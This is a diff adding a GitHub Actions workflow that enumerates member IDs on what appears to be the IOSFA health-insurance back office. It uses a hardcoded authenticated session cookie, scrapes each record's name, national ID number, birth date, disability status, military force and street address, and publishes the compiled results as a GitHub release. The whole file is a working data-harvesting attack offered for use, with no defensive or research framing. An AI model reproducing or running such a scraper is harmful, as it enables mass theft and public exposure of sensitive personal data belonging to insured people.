@@ -1,0 +1,80 @@
+name: IOSFA Validator Range
+
+on:
+  workflow_dispatch:
+    inputs:
+      start_user:
+        description: "Numero inicial"
+        required: true
+      end_user:
+        description: "Numero final"
+        required: true
+
+jobs:
+  validar:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+
+    steps:
+      - name: Ejecutar consulta por rango
+        shell: bash
+        run: |
+          START=${{ github.event.inputs.start_user }}
+          END=${{ github.event.inputs.end_user }}
+
+          OUTPUT="resultado.txt"
+          > $OUTPUT
+
+          for USER_ID in $(seq $START $END); do
+
+            URL="http://validador.iosfa.gob.ar:5080/Afiliados/Titular/Editar/${USER_ID}"
+
+            RESPONSE=$(curl -s -L "$URL" \
+              -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" \
+              -H "Accept-Language: es-419,es;q=0.9" \
+              -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/145.0.0.0 Safari/537.36" \
+              -H "Cookie: _gid=GA1.3.2022856683.1771469080; _ga_56029ZBE95=GS2.1.s1771555226$o2$g0$t1771556191$j60$l0$h0; IOSFABackOffice=4368BAD61229F777A3023C951E4620667C6B200FA8E8B28E41124A4D06D59C73AD8FE86E76EB21A44E77FEE334D71C582094EC148D579B56BD76E883CEFA2ABF9D0C30A3FC12C46E3F2B41EF5CB5F2000D361A67851002F1FCB5C1059B3FC59DEB944F04; ASP.NET_SessionId=x4weqd2ynqjb1r4tpyp0tpiu; _ga=GA1.1.1393734416.1771468464; _ga_XHVVC4C0Q1=GS2.1.s1771570487$o4$g1$t1771572785$j49$l0$h0")
+
+            if [[ "$RESPONSE" != *"FUERZA DE ORIGEN:"* ]]; then
+              echo "USER $USER_ID = SIN DATOS" >> $OUTPUT
+              continue
+            fi
+
+            extract() {
+              echo "$RESPONSE" | grep -oP "$1" | head -n1 | sed 's/^[ \t]*//;s/[ \t]*$//'
+            }
+
+            TIPO=$(extract '(?<=dxgv dx-al\" style=\"border-left-width:0px;border-right-width:0px;\">).*?(?=</td>)')
+            ESTADO=$(extract '(?<=color:#CC0000;font-weight:bold;border-left-width:0px;border-right-width:0px;\">).*?(?=</td>)')
+            APELLIDO=$(extract '(?<=txtApellidos\" value=\").*?(?=\")')
+            NOMBRE=$(extract '(?<=txtNombres\" value=\").*?(?=\")')
+            CODIGO=$(extract '(?<=txtCodigoCredencial&#39;\)\" value=\").*?(?=\")')
+            DNI=$(extract '(?<=txtRefExterna\" value=\").*?(?=\")')
+            ESTADO_CIVIL=$(extract '(?<=cboEstadoCivil_I\" type=\"text\" value=\").*?(?=\")')
+            EDAD=$(extract '(?<=txtEdad\" value=\").*?(?=\")')
+            FECHA_NAC=$(extract '(?<=txtFecNacimiento_I\" type=\"text\" value=\").*?(?=\")')
+            DISCAPACIDAD=$(extract '(?<=cboDiscapacitado_I\" type=\"text\" value=\").*?(?=\")')
+            FUERZA=$(extract '(?<=afiFA\">).*?(?=</span>)')
+            VIGENCIA=$(extract '(?<=txtFecha_Vigencia_I\" type=\"text\" value=\").*?(?=\")')
+            ALTA_ADMIN=$(extract '(?<=txtFecha_Alta_Administrativa_AcAs.*?value=\").*?(?=\")')
+            PROVINCIA=$(extract '(?<=cboProvincia_I\" type=\"text\" value=\").*?(?=\")')
+            LOCALIDAD=$(extract '(?<=cboLocalidad_I\" type=\"text\" value=\").*?(?=\")')
+            CALLE=$(extract '(?<=txtCalle\" value=\").*?(?=\")')
+            NUMERO=$(extract '(?<=txtNumero&#39;\).*?value=\").*?(?=\")')
+
+            LINE="TIPO = $TIPO | ESTADO = $ESTADO | APELLIDO = $APELLIDO | NOMBRE = $NOMBRE | CODIGO = $CODIGO | DNI = $DNI | ESTADO CIVIL = $ESTADO_CIVIL | EDAD = $EDAD | FECHA DE NACIMIENTO = $FECHA_NAC | DISCAPACIDAD = $DISCAPACIDAD | FUERZAS DE ORIGEN = $FUERZA | VIGENCIA = $VIGENCIA | ALTA ADMINISTRATIVA = $ALTA_ADMIN | PROVIDENCIA = $PROVINCIA | LOCALIDAD = $LOCALIDAD | CALLE = $CALLE | NUMERO = $NUMERO"
+
+            echo "$LINE" >> $OUTPUT
+
+          done
+
+      - name: Crear Release
+        id: create_release
+        uses: softprops/action-gh-release@v2
+        with:
+          tag_name: resultado-${{ github.run_id }}
+          name: Resultado Run ${{ github.run_id }}
+          files: resultado.txt
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
